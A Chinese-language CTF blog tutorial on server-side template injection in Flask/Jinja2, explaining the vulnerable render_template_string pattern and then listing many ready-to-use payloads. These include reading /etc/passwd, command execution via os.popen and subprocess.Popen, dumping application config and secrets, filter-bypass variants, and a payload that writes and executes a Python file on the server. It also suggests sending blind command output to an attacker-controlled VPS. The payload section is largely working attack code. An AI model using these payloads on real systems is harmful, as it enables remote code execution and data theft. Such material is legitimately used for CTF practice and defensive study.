<!DOCTYPE html><html lang="en"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content=""><meta name="theme-color" content="#2d4356"><meta name="baidu-site-verification"><title>ssti-flak框架 | sakura</title><link rel="stylesheet" type="text/css" href="/css/style.css"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.png"><link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js"></script><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="sakura" type="application/atom+xml">
</head><link rel="stylesheet" type="text/css" href="/plugins/highlight/atom-one-dark.min.css"><script type="text/javascript" src="/plugins/highlight/highlight.min.js"></script><script>hljs.initHighlightingOnLoad();
</script><script type="text/javascript" src="/js/ready.js" async></script><link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css"><body class="night"><div class="mobile-head" id="mobile-head"><div class="navbar-icon"><span></span><span></span><span></span></div><div class="navbar-title"><a href="/">LITREILY</a></div><div class="navbar-search"><!--= show a circle here--></div></div><div class="h-wrapper" id="menu"><nav class="h-head box"><div class="m-hdimg"><a class="hdimg img" href="/"><img class="nofancybox" src="/img/profile.jpg" width="128" height="128"></a><h1 class="ttl"><a href="/">sakura</a></h1></div><p class="m-desc">那就祝我们有讲不完的笑话和数不尽的浪漫</p><div class="m-nav"><ul><li><span class="dot">●</span><a href="/archives/">归档</a></li><li><span class="dot">●</span><a href="/categories/">分类</a></li><li><span class="dot">●</span><a href="/tags/">标签</a></li><li><span class="dot">●</span><a href="/about/">关于</a></li><li><span class="dot">●</span><a href="/atom.xml">RSS</a></li><li class="m-sch"><form class="form" id="j-formsch" method="get"><input class="txt" type="text" id="local-search-input" name="q" value="搜索" onfocus="if(this.value=='搜索'){this.value='';}" onblur="if(this.value==''){this.value='搜索';}"><input type="text" style="display:none;"></form></li></ul><div id="local-search-result"></div></div></nav></div><div id="back2Top"><a class="fa fa-arrow-up" title="Back to top" href="#"></a></div><div class="box" id="container"><div class="l-wrapper"><div class="l-content box"><div class="l-post l-post-art"><article class="p-art"><div class="p-header box"><h1 class="p-title">ssti-flak框架</h1><div class="p-info"><span class="p-date"><i class="fa fa-calendar"></i><a href="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/">2021-10-15</a></span><span class="p-category"><i class="fa fa-folder"></i><a href="/categories/CTF/">CTF</a>&nbsp;&bull;&nbsp;<a href="/categories/CTF/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/">模板注入</a></span><span class="p-view" id="busuanzi_container_page_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_page_pv"></span></span></div></div><div class="p-content"><h2 id="初始ssti漏洞"><a href="#初始ssti漏洞" class="headerlink" title="初始ssti漏洞"></a>初始ssti漏洞</h2><blockquote>
<p>SSTI(Server-Side Template Injection) 服务端模板注入，就是服务器模板中拼接了恶意用户输入导致各种漏洞。通过模板，Web应用可以把输入转换成特定的HTML文件或者email格式</p>
</blockquote>
<p><strong>SSTI</strong>，<strong>服务器端模板注入</strong>(Server-Side Template Injection)</p>
<ul>
<li>服务端接收攻击者的输入，将其作为Web应用模板内容的一部分</li>
<li>在进行目标编译渲染的过程中，进行了语句的拼接，执行了所插入的恶意内容</li>
<li>从而导致信息泄露、代码执行、GetShell等问题</li>
<li>其影响范围主要取决于模版引擎的复杂性</li>
<li><strong>注意</strong>：模板引擎 和 渲染函数 本身是没有漏洞的 , 该漏洞的产生原因在于程序员对代码的不严禁与不规范 , 导致了模板可控 , 从而引发代码注入</li>
</ul>
<p>ssti漏洞其实有很多种，因为不同的框架语法不同，所以呢，我们注入的时候还要判断是什么框架</p>
<p>主要的模板语言（我们经常使用的是flask）</p>
<ul>
<li>Python：flask、 mako、 tornado、 django</li>
<li>php：smarty、 twig</li>
<li>java：jade、 velocity</li>
</ul>
<p>这次我们介绍的常用的flask框架，常用的语言为jinjia2。</p>
<h3 id="路由"><a href="#路由" class="headerlink" title="路由"></a>路由</h3><p>先看一段代码</p>
<pre><code>from flask import flask 
@app.route(&#39;/index/&#39;)
def hello_word():
    return &#39;hello word&#39;
</code></pre>
<p><code>route</code>装饰器的作用是将函数与url绑定起来。例子中的代码的作用就是当你访问<code>http://127.0.0.1：5000/index</code>的时候，flask会返回hello word。</p>
<h3 id="渲染方法"><a href="#渲染方法" class="headerlink" title="渲染方法"></a>渲染方法</h3><p>flask的渲染方法有render_template和render_template_string两种。</p>
<p>render_template()是用来渲染一个指定的文件的。使用如下</p>
<pre><code>return render_template(&#39;index.html&#39;)
</code></pre>
<p>render_template_string则是用来渲染一个字符串的。SSTI与这个方法密不可分。</p>
<p>使用方法如下</p>
<pre><code>html = &#39;&lt;h1&gt;This is index page&lt;/h1&gt;&#39;
return render_template_string(html)
</code></pre>
<h3 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h3><p>flask是使用Jinja2来作为渲染引擎的。看例子</p>
<p>在网站的根目录下新建<code>templates</code>文件夹，这里是用来存放html文件。也就是模板文件。</p>
<p>test.py</p>
<pre><code>from flask import Flask,url_for,redirect,render_template,render_template_string
@app.route(&#39;/index/&#39;)
def user_login():
    return render_template(&#39;index.html&#39;)
</code></pre>
<p>/templates/index.html</p>
<pre><code>&lt;h1&gt;This is index page&lt;/h1&gt;
</code></pre>
<p>访问<code>127.0.0.1:5000/index/</code>的时候，flask就会渲染出index.html的页面。</p>
<p>模板文件并不是单纯的html代码，而是夹杂着模板的语法，因为页面不可能都是一个样子的，有一些地方是会变化的。比如说显示用户名的地方，这个时候就需要使用模板支持的语法，来传参。</p>
<p>例子</p>
<p>test.py</p>
<pre><code>from flask import Flask,url_for,redirect,render_template,render_template_string
@app.route(&#39;/index/&#39;)
def user_login():
    return render_template(&#39;index.html&#39;,content=&#39;This is index page.&#39;)
</code></pre>
<p>/templates/index.html</p>
<pre><code>&lt;h1&gt;&#123;&#123;content&#125;&#125;&lt;/h1&gt;
</code></pre>
<p>这个时候页面仍然输出<code>This is index page</code>。</p>
<pre><code>&#123;&#123;&#125;&#125;在Jinja2中作为变量包裹标识符。
```

不正确的使用flask中的`render_template_string`方法会引发SSTI。那么是什么不正确的代码呢？

### xss利用

存在漏洞的代码

```
@app.route('/test/')
def test():
    code = request.args.get('id')
    html = '''
        <h3>%s</h3>
    '''%(code)
    return render_template_string(html)
```

这段代码存在漏洞的原因是数据和代码的混淆。代码中的`code`是用户可控的，会和html拼接后直接带入渲染。

尝试构造code为一串js代码。

![1.png](ssti-flak框架/1540787703_5bd68df77bdf5.png!small)

将代码改为如下

```
@app.route('/test/')
def test():
    code = request.args.get('id')
    return render_template_string('<h1>&#123;&#123; code &#125;&#125;&lt;/h1&gt;&#39;,code=code)
</h1></code></pre>
<p>继续尝试</p>
<p><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/1540787852_5bd68e8c570a5.png!small" alt="2.png"></p>
<p>可以看到，js代码被原样输出了。这是因为模板引擎一般都默认对渲染的变量值进行编码转义，这样就不会存在xss了。在这段代码中用户所控的是code变量，而不是模板内容。存在漏洞的代码中，模板内容直接受用户控制的。</p>
<p>模板注入并不局限于xss，它还可以进行其他攻击。</p>
<h3 id="SSTI文件读取-命令执行"><a href="#SSTI文件读取-命令执行" class="headerlink" title="SSTI文件读取/命令执行"></a>SSTI文件读取/命令执行</h3><h4 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h4><p>在Jinja2模板引擎中，<code>&#123;&#123;&#125;&#125;`是变量包裹标识符。`&#123;&#123;&#125;&#125;</code>并不仅仅可以传递变量，还可以执行一些简单的表达式。</p>
<p>这里还是用上文中存在漏洞的代码</p>
<pre><code>@app.route(&#39;/test/&#39;)
def test():
    code = request.args.get(&#39;id&#39;)
    html = &#39;&#39;&#39;
        &lt;h3&gt;%s&lt;/h3&gt;
    &#39;&#39;&#39;%(code)
    return render_template_string(html)
</code></pre>
<p>构造参数<code>&#123;&#123;2*4&#125;&#125;</code>，结果如下</p>
<p><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/1540787878_5bd68ea683cce.png!small" alt="3.png">可以看到表达式被执行了。</p>
<p>在flask中也有一些全局变量。<img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/1540787904_5bd68ec05001a.png!small" alt="4.png"></p>
<h4 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h4><p>看了师傅们的文章，是通过python的对象的继承来一步步实现文件读取和命令执行的的。顺着师傅们的思路，再理一遍。</p>
<p>找到父类<code>&lt;type &#39;object&#39;&gt;</code>–&gt;寻找子类–&gt;找关于命令执行或者文件操作的模块。</p>
<p>几个魔术方法</p>
<pre><code>__class__  返回类型所属的对象
__mro__    返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。
__base__   返回该对象所继承的基类
// __base__和__mro__都是用来寻找基类的

__subclasses__   每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表
__init__  类的初始化方法
__globals__  对包含函数全局变量的字典的引用
</code></pre>
<p>1 、获取字符串的类对象</p>
<pre><code>&gt;&gt;&gt; &#39;&#39;.__class__
&lt;type &#39;str&#39;&gt;
</code></pre>
<p>2 、寻找基类</p>
<pre><code>&gt;&gt;&gt; &#39;&#39;.__class__.__mro__
(&lt;type &#39;str&#39;&gt;, &lt;type &#39;basestring&#39;&gt;, &lt;type &#39;object&#39;&gt;)
</code></pre>
<p>3 、寻找可用引用</p>
<pre><code>&gt;&gt;&gt; &#39;&#39;.__class__.__mro__[2].__subclasses__()
[&lt;type &#39;type&#39;&gt;, &lt;type &#39;weakref&#39;&gt;, &lt;type &#39;weakcallableproxy&#39;&gt;, &lt;type &#39;weakproxy&#39;&gt;, &lt;type &#39;int&#39;&gt;, &lt;type &#39;basestring&#39;&gt;, &lt;type &#39;bytearray&#39;&gt;, &lt;type &#39;list&#39;&gt;, &lt;type &#39;NoneType&#39;&gt;, &lt;type &#39;NotImplementedType&#39;&gt;, &lt;type &#39;traceback&#39;&gt;, &lt;type &#39;super&#39;&gt;, &lt;type &#39;xrange&#39;&gt;, &lt;type &#39;dict&#39;&gt;, &lt;type &#39;set&#39;&gt;, &lt;type &#39;slice&#39;&gt;, &lt;type &#39;staticmethod&#39;&gt;, &lt;type &#39;complex&#39;&gt;, &lt;type &#39;float&#39;&gt;, &lt;type &#39;buffer&#39;&gt;, &lt;type &#39;long&#39;&gt;, &lt;type &#39;frozenset&#39;&gt;, &lt;type &#39;property&#39;&gt;, &lt;type &#39;memoryview&#39;&gt;, &lt;type &#39;tuple&#39;&gt;, &lt;type &#39;enumerate&#39;&gt;, &lt;type &#39;reversed&#39;&gt;, &lt;type &#39;code&#39;&gt;, &lt;type &#39;frame&#39;&gt;, &lt;type &#39;builtin_function_or_method&#39;&gt;, &lt;type &#39;instancemethod&#39;&gt;, &lt;type &#39;function&#39;&gt;, &lt;type &#39;classobj&#39;&gt;, &lt;type &#39;dictproxy&#39;&gt;, &lt;type &#39;generator&#39;&gt;, &lt;type &#39;getset_descriptor&#39;&gt;, &lt;type &#39;wrapper_descriptor&#39;&gt;, &lt;type &#39;instance&#39;&gt;, &lt;type &#39;ellipsis&#39;&gt;, &lt;type &#39;member_descriptor&#39;&gt;, &lt;type &#39;file&#39;&gt;, &lt;type &#39;PyCapsule&#39;&gt;, &lt;type &#39;cell&#39;&gt;, &lt;type &#39;callable-iterator&#39;&gt;, &lt;type &#39;iterator&#39;&gt;, &lt;type &#39;sys.long_info&#39;&gt;, &lt;type &#39;sys.float_info&#39;&gt;, &lt;type &#39;EncodingMap&#39;&gt;, &lt;type &#39;fieldnameiterator&#39;&gt;, &lt;type &#39;formatteriterator&#39;&gt;, &lt;type &#39;sys.version_info&#39;&gt;, &lt;type &#39;sys.flags&#39;&gt;, &lt;type &#39;exceptions.BaseException&#39;&gt;, &lt;type &#39;module&#39;&gt;, &lt;type &#39;imp.NullImporter&#39;&gt;, &lt;type &#39;zipimport.zipimporter&#39;&gt;, &lt;type &#39;posix.stat_result&#39;&gt;, &lt;type &#39;posix.statvfs_result&#39;&gt;, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &lt;class &#39;_weakrefset._IterationGuard&#39;&gt;, &lt;class &#39;_weakrefset.WeakSet&#39;&gt;, &lt;class &#39;_abcoll.Hashable&#39;&gt;, &lt;type &#39;classmethod&#39;&gt;, &lt;class &#39;_abcoll.Iterable&#39;&gt;, &lt;class &#39;_abcoll.Sized&#39;&gt;, &lt;class &#39;_abcoll.Container&#39;&gt;, &lt;class &#39;_abcoll.Callable&#39;&gt;, &lt;type &#39;dict_keys&#39;&gt;, &lt;type &#39;dict_items&#39;&gt;, &lt;type &#39;dict_values&#39;&gt;, &lt;class &#39;site._Printer&#39;&gt;, &lt;class &#39;site._Helper&#39;&gt;, &lt;type &#39;_sre.SRE_Pattern&#39;&gt;, &lt;type &#39;_sre.SRE_Match&#39;&gt;, &lt;type &#39;_sre.SRE_Scanner&#39;&gt;, &lt;class &#39;site.Quitter&#39;&gt;, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;]


可以看到有一个`&lt;type &#39;file&#39;&gt;`
</code></pre>
<p>4 、利用之</p>
<pre><code>&#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#39;/etc/passwd&#39;).read()
</code></pre>
<p>放到模板里<img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/1540787928_5bd68ed820299.png!small" alt="5.png"></p>
<p>可以看到读取到了文件。</p>
<h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><p>继续看命令执行payload的构造，思路和构造文件读取的一样。</p>
<p>寻找包含os模块的脚本</p>
<pre><code>#!/usr/bin/env python
# encoding: utf-8
for item in &#39;&#39;.__class__.__mro__[2].__subclasses__():
    try:
         if &#39;os&#39; in item.__init__.__globals__:
             print num,item
         num+=1
    except:
        print &#39;-&#39;
        num+=1
</code></pre>
<p>输出</p>
<pre><code>-
71 &lt;class &#39;site._Printer&#39;&gt;
-
-
-
-
76 &lt;class &#39;site.Quitter&#39;&gt;
</code></pre>
<p>payload</p>
<pre><code class="python">&#39;&#39;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#39;os&#39;].system(&#39;ls&#39;)
</code></pre>
<p>一般利用点还有 warnings.catch_warnings（一般在59）这个子类，虽然它没有os模块，但warnings.catch_warnings类在在内部定义了_module=sys.modules[‘warnings’]，然后warnings模块包含有__builtins__，也就是说如果可以找到warnings.catch_warnings类，则可以不使用globals，payload如下</p>
<pre><code>&#123;&#123;''.__class__.__mro__[1].__subclasses__()[40]()._module.__builtins__['__import__']("os").popen('whoami').read()&#125;&#125;
</code></pre>
<p>总而言之，原理都是先找到含有__builtins__的类，然后再进一步利用</p>
<ul>
<li>subprocess.Popen进行RCE</li>
</ul>
<p>我们可以用find2.py寻找subprocess.Popen这个类，可以直接RCE，payload如下</p>
<pre><code>&#123;&#123;''.__class__.__mro__[2].__subclasses__()[258]('whoami',shell=True,stdout=-1).communicate()[0].strip()&#125;&#125;
</code></pre>
<ul>
<li>直接利用os</li>
</ul>
<p>一开始我以为这种方法只能用于python2，因为我在本地实验的时候python3中无法找到直接含有os的类，但后来发现python3其实也是能够用的，主要是环境里面有这个那个类才行</p>
<p>我们把上面的find.py脚本中的search变量赋值为os，去寻找含有os的类</p>
<pre><code>λ python find.py
(&lt;class &#39;site._Printer&#39;&gt;, 69)
(&lt;class &#39;site.Quitter&#39;&gt;, 74)
</code></pre>
<p>后面如法炮制，payload如下</p>
<pre><code>&#123;&#123;().__class__.__base__.__subclasses__()[69].__init__.__globals__['os'].popen('whoami').read()&#125;&#125;
</code></pre>
<p>构造paylaod的思路和构造文件读取的是一样的。只不过命令执行的结果无法直接看到，需要利用curl将结果发送到自己的vps或者利用ceye</p>
<p>一些利用脚本：</p>
<p>find.py</p>
<p><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/f5452aaf65534a159b2328f9b8152b07.jpeg" alt="img"></p>
<p>我们运行这个脚本</p>
<pre><code>λ python3 find.py
&lt;class &#39;os._wrap_close&#39;&gt; 128
</code></pre>
<p>可以发现object基类的第128个子类名为os._wrap_close的这个类有popen方法</p>
<p>先调用它的__init__方法进行初始化类</p>
<pre><code>Python 3.7.8
&gt;&gt;&gt; &quot;&quot;.__class__.__bases__[0].__subclasses__()[128].__init__
&lt;function _wrap_close.__init__ at 0x000001FCD0B21E58&gt;
</code></pre>
<p>再调用__globals__可以获取到方法内以字典的形式返回的方法、属性等值</p>
<pre><code>Python 3.7.8
&gt;&gt;&gt; &quot;&quot;.__class__.__bases__[0].__subclasses__()[128].__init__.__globals__
&#123;&#39;__name__&#39;: &#39;os&#39;...中间省略...&lt;class &#39;os.PathLike&#39;&gt;&#125;
</code></pre>
<p>然后就可以调用其中的popen来执行命令</p>
<pre><code>Python 3.7.8
&gt;&gt;&gt; &quot;&quot;.__class__.__bases__[0].__subclasses__()[128].__init__.__globals__[&#39;popen&#39;](&#39;whoami&#39;).read()
&#39;desktop-t6u2ptl\\think\n&#39;
</code></pre>
<p>但是上面的方法仅限于在本地寻找，因为在做CTF题目的时候，我们无法在题目环境中运行这个find.py，这里用hhhm师傅的一个脚本直接去寻找子类</p>
<p>我们首先把所有的子类列举出来</p>
<pre><code>Python 3.7.8
&gt;&gt;&gt; ().__class__.__bases__[0].__subclasses__()
...一大堆的子类
</code></pre>
<p>然后把子类列表放进下面脚本中的a中，然后寻找os._wrap_close这个类</p>
<p>find2.py</p>
<p><a href="javascript:void(0);"><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/copycode.gif" alt="复制代码"></a></p>
<pre><code>import json

a = &quot;&quot;&quot;
&lt;class &#39;type&#39;&gt;,...,&lt;class &#39;subprocess.Popen&#39;&gt;
&quot;&quot;&quot;

num = 0
allList = []

result = &quot;&quot;
for i in a:
    if i == &quot;&gt;&quot;:
        result += i
        allList.append(result)
        result = &quot;&quot;
    elif i == &quot;\n&quot; or i == &quot;,&quot;:
        continue
    else:
        result += i
        
for k,v in enumerate(allList):
    if &quot;os._wrap_close&quot; in v:
        print(str(k)+&quot;---&gt;&quot;+v)
</code></pre>
<p><a href="javascript:void(0);"><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/copycode.gif" alt="复制代码"></a></p>
<p><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/552cd597f7d84fcc9d284fdfe0fba5d4.jpeg" alt="img"></p>
<p>我们首先把所有的子类列举出来</p>
<pre><code>Python 3.7.8
&gt;&gt;&gt; ().__class__.__bases__[0].__subclasses__()
...一大堆的子类
</code></pre>
<p>然后把子类列表放进下面脚本中的a中，然后寻找os._wrap_close这个类</p>
<p>find2.py</p>
<p><a href="javascript:void(0);"><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/copycode-16342831245848.gif" alt="复制代码"></a></p>
<pre><code>import json

a = &quot;&quot;&quot;
&lt;class &#39;type&#39;&gt;,...,&lt;class &#39;subprocess.Popen&#39;&gt;
&quot;&quot;&quot;

num = 0
allList = []

result = &quot;&quot;
for i in a:
    if i == &quot;&gt;&quot;:
        result += i
        allList.append(result)
        result = &quot;&quot;
    elif i == &quot;\n&quot; or i == &quot;,&quot;:
        continue
    else:
        result += i
        
for k,v in enumerate(allList):
    if &quot;os._wrap_close&quot; in v:
        print(str(k)+&quot;---&gt;&quot;+v)
</code></pre>
<p><a href="javascript:void(0);"><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/copycode-16342831245848.gif" alt="复制代码"></a></p>
<p><img src="https://p6-tt-ipv6.byteimg.com/origin/pgc-image/552cd597f7d84fcc9d284fdfe0fba5d4" alt="img"></p>
<p>又或者用如下的requests脚本去跑</p>
<p>find3.py</p>
<p><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/4512851a74e64923982ffcf8b91e38b9.jpeg" alt="img"></p>
<p><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/9c63cdfd510c443a8294cfb5091773d6.jpeg" alt="img"></p>
<h2 id="大概过程（读取config）"><a href="#大概过程（读取config）" class="headerlink" title="大概过程（读取config）"></a>大概过程（读取config）</h2><p>一般来说，读取config我们直接就，就能读取config配置文件，但是为了增加难度，肯定会过滤掉config，让我们读取config配置文件</p>
<p>这时就需要通过python自带函数调用____globals____变量集合,然后调用其中的current_app全局变量的config</p>
<h3 id="flask有4个全局变量"><a href="#flask有4个全局变量" class="headerlink" title="flask有4个全局变量"></a>flask有4个全局变量</h3><pre><code>current_app代表当前flask程序实例
g作为flask程序全局的临时变量
requests客户端发送的HTTP请求内容
session用户会话
</code></pre>
<h3 id="python自带函数"><a href="#python自带函数" class="headerlink" title="python自带函数"></a>python自带函数</h3><h4 id="config"><a href="#config" class="headerlink" title="config"></a>config</h4><p>你可以从模板中直接访问Flask当前的config对象:</p>
<pre><code>&#123;&#123;config.SQLALCHEMY_DATABASE_URI&#125;&#125;
sqlite:///database.db
</code></pre>
<h4 id="request"><a href="#request" class="headerlink" title="request"></a>request</h4><p>就是flask中代表当前请求的request对象：</p>
<pre><code>&#123;&#123;request.url&#125;&#125;
http://127.0.0.1
</code></pre>
<h4 id="session"><a href="#session" class="headerlink" title="session"></a>session</h4><p>为Flask的session对象</p>
<pre><code>&#123;&#123;session.new&#125;&#125;
True
</code></pre>
<h4 id="url-for"><a href="#url-for" class="headerlink" title="url_for()"></a>url_for()</h4><p>url_for会根据传入的路由器函数名,返回该路由对应的URL,在模板中始终使用url_for()就可以安全的修改路由绑定的URL,则不比担心模板中渲染出错的链接:</p>
<pre><code>&#123;&#123;url_for('home')&#125;&#125;
/
</code></pre>
<p>如果我们定义的路由URL是带有参数的,则可以把它们作为关键字参数传入url_for(),Flask会把他们填充进最终生成的URL中:</p>
<pre><code>&#123;&#123; url_for('post', post_id=1)&#125;&#125;
/post/1
</code></pre>
<h4 id="get-flashed-messages"><a href="#get-flashed-messages" class="headerlink" title="get_flashed_messages()"></a>get_flashed_messages()</h4><p>这个函数会返回之前在flask中通过flask()传入的消息的列表，flash函数的作用很简单,可以把由Python字符串表示的消息加入一个消息队列中，再使用get_flashed_message()函数取出它们并消费掉：</p>
<pre><code>&#123;%for message in get_flashed_messages()%&#125;
    &#123;&#123;message&#125;&#125;
&#123;%endfor%&#125;
</code></pre>
<p>大致playload</p>
<pre><code>&#123;&#123;url_for('__globals__')['current_app']['config']&#125;&#125;
</code></pre>
<p>下面我列一些pos</p>
<pre><code>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].open('app.py','r').read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;
</code></pre>
<pre><code class="python">读目录、文件
&#123;&#123;[].__class__.__base__.__subclasses__()[59].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('ls').read()")&#125;&#125;
&#123;&#123;[].__class__.__base__.__subclasses__()[59].__init__.__globals__['__builtins__']['eval']("__import__('os').listdir('/')")&#125;&#125;
&#123;&#123;[].__class__.__bases__[0].__subclasses__()[71].__init__.__globals__['os'].__dict__['system']('ls')&#125;&#125;
&#123;&#123;[].__class__.__bases__[0].__subclasses__()[71].__init__.__globals__['os'].popen(cat /xxx/flag)&#125;&#125;
&#123;&#123;[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.open('xxx','r').read()&#125;&#125;
页面没有回显时
#命令执行： 
&#123;% for c in [].__class__.__base__.__subclasses__() %&#125; 
#先通过for循环根据模块名寻找符合要求的模块
&#123;% if c.__name__=='catch_warnings' %&#125;
&#123;&#123; c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('id').read()") &#125;&#125;

#如果找到该模块就进行后续的函数操作
&#123;% endif %&#125;&#123;% endfor %&#125; 
  # 结束判断结束循环
#文件操作    &#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;
&#123;&#123; c.__init__.__globals__['__builtins__'].open('filename', 'r').read() &#125;&#125;
&#123;% endif %&#125;&#123;% endfor %&#125;
</code></pre>
<h2 id="一些绕过方法"><a href="#一些绕过方法" class="headerlink" title="一些绕过方法"></a>一些绕过方法</h2><p>对一些过滤的绕过方法</p>
<h3 id="过滤了小括号"><a href="#过滤了小括号" class="headerlink" title="过滤了小括号"></a>过滤了小括号</h3><p>用python的内置函数</p>
<ul>
<li>get_flashed_messages()</li>
<li>url_for()</li>
</ul>
<p>payload</p>
<pre><code class="python">&#123;&#123;url_for.__globals__&#125;&#125;
&#123;&#123;url_for.__globals__['current_app'].config['FLAG']&#125;&#125;

&#123;&#123;get_flashed_messages.__globals__['current_app'].config['FLAG']&#125;&#125;
1234
</code></pre>
<h4 id="过滤了-class、-subclasses、-read等关键词"><a href="#过滤了-class、-subclasses、-read等关键词" class="headerlink" title="过滤了 class、 subclasses、 read等关键词"></a>过滤了 <code>class</code>、 <code>subclasses</code>、 <code>read</code>等关键词</h4><p>用request</p>
<ul>
<li>GET: request.args</li>
<li>Cookies: request.cookies</li>
<li>Headers: request.headers</li>
<li>Environment: request.environ</li>
<li>Values: request.values</li>
</ul>
<p>一些用法</p>
<ul>
<li><code>request.__class__</code></li>
<li><code>request[&quot;__class__&quot;]</code></li>
<li><code>request|attr(&quot;__class__&quot;)</code></li>
</ul>
<p>payload</p>
<pre><code class="python">&#123;&#123;''[request.args.a][request.args.b][2][request.args.c]()&#125;&#125;?a=__class__&amp;b=__mro__&amp;c=__subclasses__
1
</code></pre>
<h4 id="过滤了下划线"><a href="#过滤了下划线" class="headerlink" title="过滤了下划线_"></a>过滤了下划线<code>_</code></h4><p>payload</p>
<pre><code class="python">&#123;&#123;request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)&#125;&#125;&amp;class=class&amp;usc=_
</code></pre>
<p>其实现过程如下</p>
<pre><code class="python">&#123;&#123;request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)&#125;&#125;
&#123;&#123;request|attr(["_"*2,"class","_"*2]|join)&#125;&#125;
&#123;&#123;request|attr(["__","class","__"]|join)&#125;&#125;
&#123;&#123;request|attr("__class__")&#125;&#125;
&#123;&#123;request.__class__&#125;&#125;
</code></pre>
<h4 id="过滤了中括号-和"><a href="#过滤了中括号-和" class="headerlink" title="过滤了中括号[和]"></a>过滤了中括号<code>[</code>和<code>]</code></h4><p>payload</p>
<pre><code class="python">&#123;&#123;request|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)&#125;&#125;&amp;class=class&amp;usc=_
&#123;&#123;request|attr(request.args.getlist(request.args.l)|join)&#125;&#125;&amp;l=a&amp;a=_&amp;a=_&amp;a=class&amp;a=_&amp;a=_
12
</code></pre>
<h4 id="过滤了-join"><a href="#过滤了-join" class="headerlink" title="过滤了|join"></a>过滤了<code>|join</code></h4><p>用<code>|format</code>    payload</p>
<pre><code class="python">&#123;&#123;request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))&#125;&#125;&amp;f=%s%sclass%s%s&amp;a=_
1
</code></pre>
<h4 id="无敌绕过的最终RCE"><a href="#无敌绕过的最终RCE" class="headerlink" title="无敌绕过的最终RCE"></a>无敌绕过的最终RCE</h4><p>绕过<code>[</code>，<code>]</code>检查，但不绕过<code>__</code>检查<br> 使用该<code>set</code>函数来访问必需的<code>object（i）</code>类<br> <code>pop()</code>将检索file对象，然后使用我们的已知参数调用该对象<br> 与初始RCE相似，这将创建一个python文件<code>/tmp/foo.py</code>并执行<code>print 1337</code>有效负载</p>
<pre><code class="python">&#123;%set%20a,b,c,d,e,f,g,h,i%20=%20request.__class__.__mro__%&#125;&#123;&#123;i.__subclasses__().pop(40)(request.args.file,request.args.write).write(request.args.payload)&#125;&#125;&#123;&#123;config.from_pyfile(request.args.file)&#125;&#125;&amp;file=/tmp/foo.py&amp;write=w&amp;payload=print+1337
</code></pre>
<p>绕过所有的rce</p>
<pre><code class="python">&#123;%set%20a,b,c,d,e,f,g,h,i%20=%20request|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)|attr((request.args.usc*2,request.args.mro,request.args.usc*2)|join)%&#125;&#123;&#123;(i|attr((request.args.usc*2,request.args.subc,request.args.usc*2)|join)()).pop(40)(request.args.file,request.args.write).write(request.args.payload)&#125;&#125;&#123;&#123;config.from_pyfile(request.args.file)&#125;&#125;&amp;class=class&amp;mro=mro&amp;subc=subclasses&amp;usc=_&amp;file=/tmp/foo.py&amp;write=w&amp;payload=print+1337
</code></pre>
<h1 id="python2的方法"><a href="#python2的方法" class="headerlink" title="python2的方法"></a><strong>python2的方法</strong></h1><p>因为python3和python2两个版本下有差别，这里把python2单独拿出来说</p>
<p>tips：python2的string类型不直接从属于属于基类，所以要用两次 <strong>bases</strong>[0]</p>
<p><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/97cd39ea2aec44709fc68929a10ed2ea.jpeg" alt="img"></p>
<ul>
<li>file类读写文件</li>
</ul>
<p>本方法只能适用于python2，因为在python3中file类已经被移除了</p>
